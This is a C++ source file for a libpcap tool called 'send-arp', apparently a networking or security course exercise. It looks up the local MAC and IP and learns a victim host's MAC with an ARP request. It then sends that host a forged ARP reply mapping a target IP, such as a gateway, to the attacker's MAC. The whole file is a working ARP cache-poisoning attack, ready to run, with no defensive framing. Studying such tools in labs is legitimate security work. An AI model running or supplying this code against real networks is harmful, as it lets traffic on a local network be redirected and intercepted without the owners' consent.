#include <iostream>
#include <stdio.h>
#include <cstdio>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#pragma pack(push, 1)
struct arp_packet {
  EthHdr eth_;
  ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
  printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
  printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// ref:
// https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx
Mac get_my_mac_address(char* dev) {
  int fd;

  struct ifreq ifr;
  Mac mac_address;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, (const char*)dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFHWADDR, &ifr);

  close(fd);

  mac_address = (uint8_t*)ifr.ifr_hwaddr.sa_data;

  return mac_address;
}

// ref:
// https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
Ip get_my_ipv4_address(const char* dev) {
  int fd;
  struct ifreq ifr;
  uint32_t ip_address;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFADDR, &ifr);

  close(fd);

  ip_address = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);

  return ip_address;
}

int aio_send_packet(pcap_t* handle, Mac ethernetDestinationMac,
                    Mac ethernetSourceMac, u_short operation, Mac arpSourceMac,
                    u_long arpSourceIp, Mac arpTargetMac, u_long arpTargetIp) {
  arp_packet packet;

  packet.eth_.dmac_ = ethernetDestinationMac;
  packet.eth_.smac_ = ethernetSourceMac;
  packet.eth_.type_ = htons(EthHdr::Arp);

  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = Mac::SIZE;
  packet.arp_.pln_ = Ip::SIZE;
  packet.arp_.op_ = operation;
  packet.arp_.smac_ = arpSourceMac;
  packet.arp_.sip_ = arpSourceIp;
  packet.arp_.tmac_ = arpTargetMac;
  packet.arp_.tip_ = arpTargetIp;

  return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),
                         sizeof(arp_packet));
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == nullptr) {
    printf("ERROR: Couldn't open device %s(%s)\n", dev, errbuf);
    return -1;
  }
  Mac my_mac;
  Ip  my_ip;

  my_mac = get_my_mac_address(dev);
  my_ip = get_my_ipv4_address(dev);

  Mac sender_mac;
  Ip sender_ip = Ip(argv[2]);

  Ip target_ip = Ip(argv[3]);

  int res;

  res = aio_send_packet(handle, Mac("ff:ff:ff:ff:ff:ff"), my_mac,
                        htons(ArpHdr::Request), my_mac, htonl(my_ip),
                        Mac("00:00:00:00:00:00"), htonl(sender_ip));

  if (res != 0) {
    printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
           pcap_geterr(handle));
    return -1;
  }

  struct pcap_pkthdr* header;
  const uint8_t* packet;
  while (true) {
    sleep(0);
    res = pcap_next_ex(handle, &header, &packet);

    if (res == 0) continue;
    if (res == -1 || res == -2) {
      printf("ERROR: pcap_next_ex return %d error=%s\n", res,
             pcap_geterr(handle));
      return -1;
    }

    EthHdr* respondEthernet = (EthHdr*)packet;

    if (respondEthernet->type() != EthHdr::Arp) {
      continue;
    }

    ArpHdr* arpRespond = (ArpHdr*)(packet + sizeof(EthHdr));

    if (arpRespond->hrd() != ArpHdr::ETHER ||
        arpRespond->pro() != EthHdr::Ip4 || arpRespond->op() != ArpHdr::Reply) {
      continue;
    }

    if (arpRespond->tmac() == my_mac && arpRespond->tip() == my_ip &&
        arpRespond->sip() == sender_ip) {
      sender_mac = arpRespond->smac();
      break;
    }
  }

  res = aio_send_packet(handle, sender_mac, my_mac,
                        htons(ArpHdr::Reply), my_mac, htonl(target_ip),
                        sender_mac, htonl(sender_ip));

  if (res != 0) {
    printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
           pcap_geterr(handle));
    return -1;
  }

  pcap_close(handle);

  printf("Done!\n");
}
